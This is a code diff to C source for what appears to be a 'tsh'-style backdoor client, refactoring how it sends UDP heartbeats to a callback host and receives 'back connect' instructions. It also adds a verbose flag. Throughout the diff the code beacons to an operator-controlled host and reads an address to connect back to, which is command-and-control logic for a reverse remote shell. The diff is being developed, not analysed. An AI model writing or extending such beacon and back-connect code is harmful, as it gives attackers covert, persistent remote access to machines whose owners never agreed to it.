@@ -46,6 +46,7 @@
 unsigned char message[BUFSIZE + 1];
 extern char *optarg;
 extern int optind;
+int gVerbose = 0;
 
 /* function declaration */
 
@@ -69,7 +70,7 @@ bool hasWaitConnectSignal(int udpSock, struct sockaddr_in *udpAddr, struct socka
 		struct tshProtocol data;
 		data.magic = MAGIC;
 		data.type = UPD_HEADBEAT;
-		data.length = sizeof(data);
+		data.length = TSH_PROT_HEADER_LEN;
 		
 #ifdef SCAN_IP
 		extern const char * getPayloadData();
@@ -80,44 +81,37 @@ bool hasWaitConnectSignal(int udpSock, struct sockaddr_in *udpAddr, struct socka
 			data.length += strlen(pdata);
 		}
 		info("udp send heart beat data to %s " IPBLabel "\n", cb_host, IPBValue(*udpAddr));
-		udpSendPacket(udpSock, &data, udpAddr);
-		if (data.type & UPD_PAYLOAD_DATA) {
-			udpSendCString(udpSock, pdata, udpAddr);
-		}
+		udpSendPacketData(udpSock, udpAddr, &data, pdata);
 		lastHeartBeatTime = time(NULL);
 	}
 	// 返回0表示有等待的连接请求
 
 	struct tshProtocol recvdata;
 
-	if (!udpRecvPacket(udpSock, &recvdata, NULL)) {
+	char payloadBuf[MAX_PAYLOAD_LEN];
+	struct sockaddr_in udpSrvAddr;
+	if (!udpRecvPacketData(udpSock, &recvdata, &udpSrvAddr, payloadBuf, MAX_PAYLOAD_LEN)) {
 		return false;
 	}
 
-	info("udp recv from type : 0x%08x, len : %d, [%d.%d.%d.%d:%d]\n",
-		 recvdata.type,
-		 recvdata.length,
-		 __IP3(recvdata.listen_ip), __IP2(recvdata.listen_ip),
-		 __IP1(recvdata.listen_ip), __IP0(recvdata.listen_ip),
-		 __PORT(recvdata.listen_port));
-
 	if (recvdata.type == UPD_PAYLOAD_DATA) {
-		int len = recvdata.length - sizeof(struct tshProtocol);
-		if (len > 0) {
-			char *pdata = (char *)malloc(len + 1);
-			if (pdata) {
-				memset(pdata, '\0', len + 1);
-				udpRecvData(udpSock, pdata, (size_t)len);
-				info("data is [%s]\n", pdata);
+		info("udp recv heartbeat from type : 0x%08x, len : %d, " IPBLabel "\n",
+			 recvdata.type,
+			 recvdata.length,
+			 IPBValue(udpSrvAddr));
 #ifdef SCAN_IP
-				extern void handlePayloadData(const char *);
-				handlePayloadData(pdata);
+		extern void handlePayloadData(const char *);
+		handlePayloadData(payloadBuf);
 #endif
-				free((void *)pdata);
-			}
-		}
 		return false;
 	} else if (recvdata.type == UPD_BACK_CONNECT) {
+		info("udp recv from type : 0x%08x, len : %d, [%d.%d.%d.%d:%d]\n",
+			 recvdata.type,
+			 recvdata.length,
+			 __IP3(recvdata.listen_ip), __IP2(recvdata.listen_ip),
+			 __IP1(recvdata.listen_ip), __IP0(recvdata.listen_ip),
+			 __PORT(recvdata.listen_port));
+
 		memset((void *)outServer, '\0', (size_t)sizeof(struct sockaddr_in));
 		outServer->sin_family = AF_INET;
 		outServer->sin_addr.s_addr = recvdata.listen_ip;
@@ -153,7 +147,7 @@ int main( int argc, char **argv )
 	cb_host = CB_HOST_DNS;
 #endif
 
-    while ((opt = getopt(argc, argv, "s:p:c:fd")) != -1) {
+    while ((opt = getopt(argc, argv, "s:p:c:fdv")) != -1) {
         switch (opt) {
             case 'p':
                 server_port=atoi(optarg); /* We hope ... */
@@ -174,6 +168,9 @@ int main( int argc, char **argv )
 				} else {
 					cb_host = optarg;
 				}
+				break;
+			case 'v':
+				gVerbose = 1;
 				break;
             default: /* '?' */
                 usage(*argv);
@@ -302,7 +299,7 @@ int main( int argc, char **argv )
 	    {
 			struct sockaddr_in sServer;
 			if (proxyUdp) {
-				if (udpAddr.sin_family == AF_UNSPEC || udpAddr.sin_port == 0) {
+				if (udpAddr.sin_family == AF_UNSPEC || udpAddr.sin_addr.s_addr == 0 || udpAddr.sin_port == 0) {
 					udpAddr = parseHostAndPort(cb_host, UDP_ProxyPort);
 				}
 				/* 如果UDP发送过来了反向连接的ip:port */
